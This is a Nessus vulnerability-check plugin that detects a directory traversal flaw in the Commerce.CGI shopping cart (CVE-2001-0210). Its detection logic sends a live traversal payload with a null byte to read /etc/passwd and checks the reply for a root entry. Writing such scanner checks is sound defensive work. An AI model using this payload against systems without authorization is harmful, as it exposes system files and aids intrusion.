#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10612);
 script_version ("$Revision: 1.28 $");
 script_cve_id("CVE-2001-0210");
 script_bugtraq_id(2361);
 script_osvdb_id(508);
 
 script_name(english:"Commerce.CGI Shopping Cart commerce.cgi page Parameter Traversal Arbitrary File Access");
 script_summary(english:"Checks for the presence of /cgi-bin/commerce.cgi");
 
 script_set_attribute(attribute:"synopsis", value:
"A web application running on the remote host has a directory
traversal vulnerability." );
 script_set_attribute( attribute:"description",  value:
"The 'commerce.cgi' CGI is installed.  This CGI has a well known
security flaw that lets an attacker read arbitrary files with the
privileges of the web server." );
 script_set_attribute(
   attribute:"see_also",
   value:"http://seclists.org/bugtraq/2001/Feb/44"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of this software."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");
 script_set_attribute(attribute:"plugin_publication_date", value: "2001/02/13");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/02/12");
 script_cvs_date("$Date: 2016/11/15 13:39:09 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
 
 script_copyright(english:"This script is Copyright (C) 2001-2016 Tenable Network Security, Inc.");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
 url = string(dir, '/commerce.cgi?page=../../../../../etc/passwd%00index.html');
 r = http_send_recv3(method:"GET", item:url, port:port);
 if( isnull(r) ) exit(0);

 if(egrep(pattern:".*root:.*:0:[01]:.*", string:r[2]))
 	{
	security_warning(port);
	exit(0);
	}
}
